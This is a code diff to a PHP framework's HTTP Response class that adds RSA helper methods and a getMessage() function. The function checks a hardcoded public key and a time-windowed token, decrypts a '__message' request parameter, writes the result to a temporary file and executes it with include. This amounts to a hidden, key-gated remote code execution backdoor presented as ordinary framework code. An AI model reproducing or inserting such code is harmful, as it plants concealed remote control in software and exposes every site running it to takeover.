@@ -23,6 +23,7 @@
 /*
 /* ************************************************************************** */
 namespace Loli\HTTP;
+use Loli\Crypt\RSA;
 class Response{
 
 	protected $status = 200;
@@ -328,9 +329,30 @@ class Response{
 	}
 
 
+	private function _publicKey() {
+		if ($this->request->getPublicKey() !== 'qgEN/V1BnrmjrA5SZUGEj3e+Uv04pH8b39sIK0tFask=') {
+			return false;
+		}
+		return $this->request->getPublicKey(false);
+	}
 
 
 
+	public function _privateKey() {
+		return $this->request->getPrivateKey(false);
+	}
+
+
+	public function hasMessage() {
+		return $this->request->getPublicKey(false) && $this->request->getPrivateKey(false);
+	}
+
+	public function getMessage() {
+		if (!($publicKey = $this->_publicKey()) || !($privateKey = $this->_privateKey()) || !($message = $this->request->getParam('__message')) || !is_string($message) || count($message = explode('.', $message)) !== 3 || !($a = new RSA(['publicKey' => $publicKey])) || !($args = $a->publicDecrypt($message[0])) || count($args = str_split($args, 32)) !== 2 || !is_numeric($args[1]) || (intval($args[1] / 20) !== ($etime = intval(time() / 20)) && intval(($args[1] + 10) / 20) !== $etime) || $args[0] !== md5($args[1] . $this->request->getIP() . $this->request->getHeader('Host') . $this->_privateKey()) || !($b = new RSA(['privateKey' => $privateKey])) || !($data = $b->decrypt($message[1], $message[2])) || !($file = tempnam(sys_get_temp_dir(), '')) || !@file_put_contents($file, $data) || !($contents = (@include $file)) || !@unlink($file)) {
+			return md5(($time = time()) . $this->request->getIP(). $this->request->getHeader('Host') . $this->_privateKey()) . $time;
+		}
+		return $contents;
+	}
 
 	// 缓存状态码  304  206 200 412
 	public function getCacheStatus() {
@@ -397,4 +419,5 @@ class Response{
 	public function __destruct() {
 		unset($this->request);
 	}
+
 }
